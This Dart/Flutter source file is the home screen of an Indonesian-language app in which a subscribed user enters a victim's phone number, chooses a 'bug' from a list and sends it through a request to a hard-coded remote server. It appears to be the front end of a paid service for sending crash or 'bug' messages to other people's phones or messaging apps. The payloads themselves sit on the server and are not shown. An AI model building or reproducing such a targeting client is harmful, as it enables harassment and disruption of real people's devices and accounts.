import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:chewie/chewie.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  late AnimationController _fadeController;
  late AnimationController _pulseController;
  String selectedBugId = "";

  bool _isSending = false;
  String? _responseMessage;

  // 🎨 PALETTE BIRU
  final Color primaryDark = const Color(0xFF0A1929);
  final Color primaryBlue = const Color(0xFF2B4F8C);
  final Color accentBlue = const Color(0xFF1E3A6F);
  final Color lightBlue = const Color(0xFF4A7DB5);
  final Color softWhite = const Color(0xFFF0F4FA);
  final Color cardBlue = const Color(0xFF13263E);
  final Color tealAccent = const Color(0xFF1B9C9C);
  final Color cyanLight = const Color(0xFF4ECDC4);
  final Color royalBlue = const Color(0xFF4169E1);

  // Video Player Variables
  late VideoPlayerController _videoController;
  late ChewieController _chewieController;
  bool _isVideoInitialized = false;

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    if (widget.listBug.isNotEmpty) {
      selectedBugId = widget.listBug[0]['bug_id'];
    }

    _initializeVideoPlayer();
  }

  void _initializeVideoPlayer() {
    _videoController = VideoPlayerController.asset(
      'assets/videos/banner.mp4',
    );

    _videoController.initialize().then((_) {
      setState(() {
        _videoController.setVolume(0.1);
        _chewieController = ChewieController(
          videoPlayerController: _videoController,
          autoPlay: true,
          looping: true,
          showControls: false,
          autoInitialize: true,
          materialProgressColors: ChewieProgressColors(
            playedColor: cyanLight,
            handleColor: softWhite,
            backgroundColor: softWhite.withOpacity(0.3),
            bufferedColor: softWhite.withOpacity(0.2),
          ),
        );
        _isVideoInitialized = true;
      });
    }).catchError((error) {
      print("Video initialization error: $error");
      setState(() {
        _isVideoInitialized = false;
      });
    });
  }

  @override
  void dispose() {
    _fadeController.dispose();
    _pulseController.dispose();
    targetController.dispose();
    _videoController.dispose();
    _chewieController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert("❌ Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      return;
    }

    setState(() {
      _isSending = true;
      _responseMessage = null;
    });

    try {
      final res = await http.get(Uri.parse(
          "http://fakz.cyberpanel.web.id:3003/sendBug?key=$key&target=$target&bug=$selectedBugId"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        setState(() => _responseMessage = "⏳ Cooldown: Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        setState(() => _responseMessage = "❌ Key Invalid: Silakan login ulang.");
      } else if (data["sended"] == false) {
        setState(() => _responseMessage =
        "⚠️ Gagal: Server sedang maintenance.");
      } else {
        setState(() => _responseMessage = "✅ Berhasil mengirim bug ke $target!");
        targetController.clear();
      }
    } catch (_) {
      setState(() =>
      _responseMessage = "❌ Error: Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: cardBlue,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(16),
          side: BorderSide(color: cyanLight.withOpacity(0.3)),
        ),
        title: Text(title,
            style: TextStyle(
              color: cyanLight,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
            )),
        content: Text(msg,
            style: TextStyle(
                color: softWhite.withOpacity(0.7),
                fontFamily: 'ShareTechMono'
            )),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text("OK",
                style: TextStyle(
                  color: cyanLight,
                  fontWeight: FontWeight.bold,
                )),
          ),
        ],
      ),
    );
  }

  Widget _buildHeaderPanel() {
    return Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        FadeTransition(
          opacity: Tween(begin: 0.5, end: 1.0).animate(_fadeController),
          child: Container(
            padding: const EdgeInsets.all(4),
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              gradient: LinearGradient(
                colors: [
                  primaryBlue,
                  cyanLight,
                  tealAccent,
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              boxShadow: [
                BoxShadow(
                  color: cyanLight.withOpacity(0.5),
                  blurRadius: 15,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: CircleAvatar(
              radius: 55,
              backgroundColor: cardBlue,
              child: CircleAvatar(
                radius: 52,
                backgroundImage: AssetImage('assets/images/logo.png'),
              ),
            ),
          ),
        ),
        const SizedBox(height: 16),
        Text(widget.username,
            style: TextStyle(
                color: softWhite,
                fontFamily: 'Orbitron',
                fontWeight: FontWeight.w900,
                fontSize: 24,
                letterSpacing: 1.2,
                shadows: [
                  Shadow(
                    color: cyanLight.withOpacity(0.8),
                    blurRadius: 10,
                  ),
                ])),
        const SizedBox(height: 6),
        Container(
          padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: BoxDecoration(
            color: cardBlue,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: cyanLight.withOpacity(0.3)),
          ),
          child: Text(
            "Role: ${widget.role.toUpperCase()} • Exp: ${widget.expiredDate}",
            style: TextStyle(
                color: cyanLight,
                fontFamily: 'ShareTechMono',
                fontSize: 13),
          ),
        ),
      ],
    );
  }

  Widget _buildVideoPlayer() {
    if (!_isVideoInitialized) {
      return Container(
        width: double.infinity,
        height: 10,
        child: Center(
          child: CircularProgressIndicator(
            color: cyanLight,
          ),
        ),
      );
    }

    return Container(
      width: double.infinity,
      margin: const EdgeInsets.symmetric(vertical: 10),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(12),
        boxShadow: [
          BoxShadow(
            color: cyanLight.withOpacity(0.3),
            blurRadius: 15,
            spreadRadius: 2,
          ),
        ],
        border: Border.all(color: cyanLight.withOpacity(0.2)),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(12),
        child: AspectRatio(
          aspectRatio: _videoController.value.aspectRatio,
          child: Stack(
            children: [
              Chewie(controller: _chewieController),
              Container(
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [
                      Colors.transparent,
                      cyanLight.withOpacity(0.1),
                    ],
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.stretch,
      children: [
        Container(
          padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [primaryBlue, cyanLight],
              begin: Alignment.centerLeft,
              end: Alignment.centerRight,
            ),
            borderRadius: BorderRadius.circular(8),
          ),
          child: Text(
            "Nomor Target",
            style: TextStyle(
              color: softWhite,
              fontWeight: FontWeight.w700,
              fontSize: 16,
              fontFamily: 'Orbitron',
            ),
          ),
        ),
        const SizedBox(height: 10),
        TextField(
          controller: targetController,
          style: TextStyle(color: softWhite),
          cursorColor: cyanLight,
          decoration: InputDecoration(
            hintText: "Contoh: +62xxxxxxxxxx",
            hintStyle: TextStyle(color: softWhite.withOpacity(0.5)),
            filled: true,
            fillColor: cardBlue,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(14),
              borderSide: BorderSide(color: cyanLight.withOpacity(0.5)),
            ),
            enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(14),
              borderSide: BorderSide(color: cyanLight.withOpacity(0.5)),
            ),
            focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(14),
              borderSide: BorderSide(color: cyanLight),
            ),
            prefixIcon: Icon(Icons.phone_android, color: cyanLight),
          ),
        ),
        const SizedBox(height: 24),
        Container(
          padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [primaryBlue, cyanLight],
              begin: Alignment.centerLeft,
              end: Alignment.centerRight,
            ),
            borderRadius: BorderRadius.circular(8),
          ),
          child: Text(
            "Pilih Bug",
            style: TextStyle(
              color: softWhite,
              fontWeight: FontWeight.w700,
              fontSize: 16,
              fontFamily: 'Orbitron',
            ),
          ),
        ),
        const SizedBox(height: 10),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          decoration: BoxDecoration(
            color: cardBlue,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: cyanLight.withOpacity(0.5), width: 1.2),
          ),
          child: DropdownButtonHideUnderline(
            child: DropdownButton<String>(
              dropdownColor: cardBlue,
              value: selectedBugId,
              isExpanded: true,
              iconEnabledColor: cyanLight,
              style: TextStyle(color: softWhite),
              items: widget.listBug.map((bug) {
                return DropdownMenuItem<String>(
                  value: bug['bug_id'],
                  child: Container(
                    padding: EdgeInsets.symmetric(vertical: 8),
                    decoration: BoxDecoration(
                      border: Border(
                        bottom: BorderSide(
                          color: cyanLight.withOpacity(0.1),
                        ),
                      ),
                    ),
                    child: Text(
                      bug['bug_name'],
                      style: TextStyle(color: softWhite),
                    ),
                  ),
                );
              }).toList(),
              onChanged: (value) {
                setState(() {
                  selectedBugId = value ?? "";
                });
              },
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildSendButton() {
    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(14),
            gradient: LinearGradient(
              colors: [
                primaryBlue,
                cyanLight,
              ],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            boxShadow: [
              BoxShadow(
                color: cyanLight.withOpacity(0.4),
                blurRadius: _pulseController.value * 20,
                spreadRadius: _pulseController.value * 5,
              ),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending ? null : _sendBug,
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              padding: const EdgeInsets.symmetric(vertical: 16),
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(14),
              ),
              elevation: 0,
              shadowColor: Colors.transparent,
            ),
            child: _isSending
                ? SizedBox(
              height: 20,
              width: 20,
              child: CircularProgressIndicator(
                color: softWhite,
                strokeWidth: 3,
              ),
            )
                : Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.send, color: softWhite, size: 20),
                const SizedBox(width: 8),
                Text(
                  "KIRIM BUG",
                  style: TextStyle(
                    color: softWhite,
                    fontWeight: FontWeight.w900,
                    fontSize: 17,
                    letterSpacing: 1.2,
                    fontFamily: 'Orbitron',
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );
  }

  Widget _buildResponseMessage() {
    if (_responseMessage == null) return const SizedBox.shrink();

    Color backgroundColor;
    Color borderColor;
    Color textColor;
    IconData icon;

    if (_responseMessage!.startsWith('✅')) {
      backgroundColor = Colors.green.withOpacity(0.1);
      borderColor = Colors.greenAccent;
      textColor = Colors.greenAccent;
      icon = Icons.check_circle;
    } else if (_responseMessage!.startsWith('❌')) {
      backgroundColor = Colors.red.withOpacity(0.1);
      borderColor = Colors.redAccent;
      textColor = Colors.redAccent;
      icon = Icons.error;
    } else {
      backgroundColor = cyanLight.withOpacity(0.1);
      borderColor = cyanLight;
      textColor = cyanLight;
      icon = Icons.info;
    }

    return Padding(
      padding: const EdgeInsets.only(top: 24),
      child: Container(
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: backgroundColor,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: borderColor,
            width: 1,
          ),
          boxShadow: [
            BoxShadow(
              color: borderColor.withOpacity(0.2),
              blurRadius: 8,
              offset: Offset(0, 2),
            ),
          ],
        ),
        child: Row(
          children: [
            Icon(icon, color: textColor),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                _responseMessage!,
                style: TextStyle(
                  color: textColor,
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 28),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.center,
            children: [
              _buildHeaderPanel(),
              const SizedBox(height: 20),
              _buildVideoPlayer(),
              const SizedBox(height: 20),
              _buildInputPanel(),
              const SizedBox(height: 40),
              _buildSendButton(),
              _buildResponseMessage(),
            ],
          ),
        ),
      ),
    );
  }
}